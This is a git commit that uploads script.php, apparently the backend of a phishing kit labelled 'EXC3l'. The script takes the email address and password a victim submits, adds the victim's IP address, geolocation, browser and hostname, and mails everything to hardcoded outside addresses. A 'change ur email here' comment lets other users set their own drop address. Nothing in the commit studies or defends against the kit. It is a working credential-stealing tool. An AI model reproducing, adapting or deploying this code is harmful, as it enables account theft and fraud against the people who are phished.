5255a786d3a9f2aa862388e8db7a147e57a28da9
manny1000a <90581091+manny1000a@users.noreply.github.com>
2021-09-18 01:16:22 -0700

    Add files via upload

---
+++ script.php
@@ -0,0 +1,35 @@
+<?
+$ip = getenv("REMOTE_ADDR");
+$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
+$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
+$timedate = date("D/M/d, Y g(idea) a"); 
+$browserAgent = $_SERVER['HTTP_USER_AGENT'];
+$hostname = gethostbyaddr($ip);
+$message .= "--------------EXC3l Info-----------------------\n";
+$message .= "Email Address            : ".$_POST['email']."\n";
+$message .= "Password            : ".$_POST['password']."\n";
+$message .= "-------------Vict!m Info-----------------------\n";
+$message .= "|Client IP: ".$ip."\n";
+$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+$message .= "Browser                :".$browserAgent."\n";
+$message .= "DateTime                    : ".$timedate."\n";
+$message .= "country                    : ".$country."\n";
+$message .= "HostName : ".$hostname."\n";
+$message .= "---------------Created BY BURHAN FUDPAGE [.] COM-------------\n";
+//change ur email here
+$send = "rst1000@russellnwade.xyz, carol@yithai-tw.com";
+$subject = "Result from EXC3l";
+$headers = "From: EXC3l<supertool@mxtoolbox.com>";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+$arr=array($send, $IP);
+foreach ($arr as $send)
+{
+mail($send,$subject,$message,$headers);
+mail($to,$subject,$message,$headers);
+
+ }
+  
+  
+
+?>
